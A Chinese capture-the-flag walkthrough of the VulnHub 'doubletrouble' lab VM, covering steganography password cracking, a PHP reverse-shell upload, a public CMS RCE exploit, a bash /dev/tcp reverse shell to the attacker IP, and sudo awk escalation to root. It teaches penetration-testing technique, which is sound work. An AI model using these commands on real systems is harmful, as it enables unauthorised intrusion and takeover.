# 前言

靶机：`doubletrouble`，IP地址为`192.168.10.10`

攻击：`kali`，IP地址为`192.168.10.2`

都采用虚拟机，网卡为桥接模式

该靶机目前只剩下一个了，之前记得是有两台构成系列的。

> 文章中涉及的靶机，来源于`vulnhub`官网，想要下载，可自行访问官网下载，或者通过下方链接下载`https://pan.quark.cn/s/28f410dd165f`

# 主机发现

使用`arp-scan -l`或`netdiscover -r 192.168.10.1/24`扫描

也可以使用`nmap`等工具进行

![](D:\stu\vulnhub\OSCP必刷靶场\doubletrouble靶场\pic\1.jpg)

# 信息收集

## 使用nmap扫描端口

![](D:\stu\vulnhub\OSCP必刷靶场\doubletrouble靶场\pic\2.jpg)

## 网站信息探测

访问80端口默认界面，可以看到这是某种CMS，并且版本已经有了，查看页面源代码，发现可能是目录型网站

![](D:\stu\vulnhub\OSCP必刷靶场\doubletrouble靶场\pic\3.jpg)

使用`gobuster、ffuf、dirsearch、dirb`等工具进行爆破

![](D:\stu\vulnhub\OSCP必刷靶场\doubletrouble靶场\pic\4.jpg)

# 图片隐写内容获取

访问`secret`，发现一张图片，下载到`kali`中，查看图片，发现类似于专辑的那种封面

![](D:\stu\vulnhub\OSCP必刷靶场\doubletrouble靶场\pic\5.jpg)

使用`exiftool`、`binwalk`测试并无隐藏信息

![](D:\stu\vulnhub\OSCP必刷靶场\doubletrouble靶场\pic\6.jpg)

在使用`steghide`，发现输入具有输入密码操作

![](D:\stu\vulnhub\OSCP必刷靶场\doubletrouble靶场\pic\7.jpg)

使用该系列工具`stegseek`进行破解

```shell
stegseek --crack doubletrouble.jpg /usr/share/wordlists/rockyou.txt passw.txt
```

![](D:\stu\vulnhub\OSCP必刷靶场\doubletrouble靶场\pic\8.jpg)

这时候，可以使用`steghide`继续，或者直接使用写入到文件中的信息，以这个登录到邮件登录系统

`otisrush@localhost.com`和`otis666`

# 漏洞利用

## 方式一，手动上传php脚本

然后再寻找有无利用点时，发现一个上传的，是头像上传，不过这里直接上传一个`php`文件进行测试。

以`kali`自带的`php`反弹上传，路径在`/usr/share/webshells/php/php-reverse-shell.php`

![](D:\stu\vulnhub\OSCP必刷靶场\doubletrouble靶场\pic\9.jpg)

点击保存后，发现跳转，并出现报错

![](D:\stu\vulnhub\OSCP必刷靶场\doubletrouble靶场\pic\10.jpg)

在之前目录爆破时，发现`uploads`目录，只是当时其中并未有内容，这时候再去查看，为什么呢，因为文件名称就给人是上传文件的存放处

可以看到上传的脚本文件，这里有两个，是我在进行上传后，以为哪里有问题导致没有上传成功，所以又上传了一次

![](D:\stu\vulnhub\OSCP必刷靶场\doubletrouble靶场\pic\11.jpg)

在`kali`开启监听，我在这个脚本中设置的端口是1234，监听这个端口即可

点击脚本，若是网站可解析`php`文件，则可以反弹成功

![](D:\stu\vulnhub\OSCP必刷靶场\doubletrouble靶场\pic\12.jpg)

成功获取一个`shell`，先获取一个交互式的界面

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## 方式二，搜索CMS版本漏洞

通过`CMS`的版本漏洞进行获取`shell`

使用`searchsploit`搜索版本漏洞，发现有很多，这里采用远程代码执行`v2`，注意，这里远程代码执行的漏洞，都需要先有邮箱及密码才行。

![](D:\stu\vulnhub\OSCP必刷靶场\doubletrouble靶场\pic\13.jpg)

直接把这个文件复制到当前目录，然后查看一下代码内容，代码太长，这里直接找一些用处大的截图

![](D:\stu\vulnhub\OSCP必刷靶场\doubletrouble靶场\pic\14.jpg)

直接执行该脚本，会提示用法的

![](D:\stu\vulnhub\OSCP必刷靶场\doubletrouble靶场\pic\15.jpg)

这时候，根据前面获取的邮箱和密码使用j即可

```shell
python3 50944.py  -url http://192.168.10.10/ -u otisrush@localhost.com -p otis666
```

![](D:\stu\vulnhub\OSCP必刷靶场\doubletrouble靶场\pic\16.jpg)

浏览器访问，发现命令执行了

![](D:\stu\vulnhub\OSCP必刷靶场\doubletrouble靶场\pic\17.jpg)

这时候，就可以通过传参，构造反弹`shell`的命令，如`bash`、`nc`、`python`等

```shell
/bin/bash -c 'bash -i >& /dev/tcp/192.168.10.2/9999 0>&1'

#经过url编码处理后使用
%2fbin%2fbash+-c+%27bash+-i+%3e%26+%2fdev%2ftcp%2f192.168.10.2%2f9999+0%3e%261%27
```

![](D:\stu\vulnhub\OSCP必刷靶场\doubletrouble靶场\pic\18.jpg)

# 靶机内信息收集

收集靶机内用户

```shell
ls -al /home
cat /etc/passwd | grep /bin/bash
```

![](D:\stu\vulnhub\OSCP必刷靶场\doubletrouble靶场\pic\19.jpg)

查看操作系统信息，以及内核版本

![](D:\stu\vulnhub\OSCP必刷靶场\doubletrouble靶场\pic\20.jpg)

网络状态信息

![](D:\stu\vulnhub\OSCP必刷靶场\doubletrouble靶场\pic\21.jpg)

查看进程信息、定时任务等

```shell
ps -aux
top
cat /etc/crontab
```

寻找具有SUID权限的文件

```shell
find / -perm -4000 -print 2>/dev/null
```

![](D:\stu\vulnhub\OSCP必刷靶场\doubletrouble靶场\pic\22.jpg)

发现`sudo`，因为并没有发现其他用户，猜测可能不需要水平提权，直接提取至`root`即可

# 提权

尝试`sudo`对于当前用户是否可用，发现无需密码，并且`awk`可进行`sudo`

![](D:\stu\vulnhub\OSCP必刷靶场\doubletrouble靶场\pic\23.jpg)

若不知道或忘记`awk`的`sudo`提取，可以借助网站`gtfobins.github.io`获取

![](D:\stu\vulnhub\OSCP必刷靶场\doubletrouble靶场\pic\24.jpg)

```shell
sudo /usr/bin/awk 'BEGIN {system("/bin/bash")}'
```

![](D:\stu\vulnhub\OSCP必刷靶场\doubletrouble靶场\pic\25.jpg)

不过没有`flag`，可能到这里就可以了

# 总结

该靶机考察以下几点：

1. 网站目录爆破
2. 图片隐写内容及其密码的暴力破解
3. 通过上传头像处的文件上传漏洞，促使反弹`shell`
4. `searchsploit`的使用，以及发现CMS版本漏洞，会利用
5. 对于`sudo`各种命令的提权



















































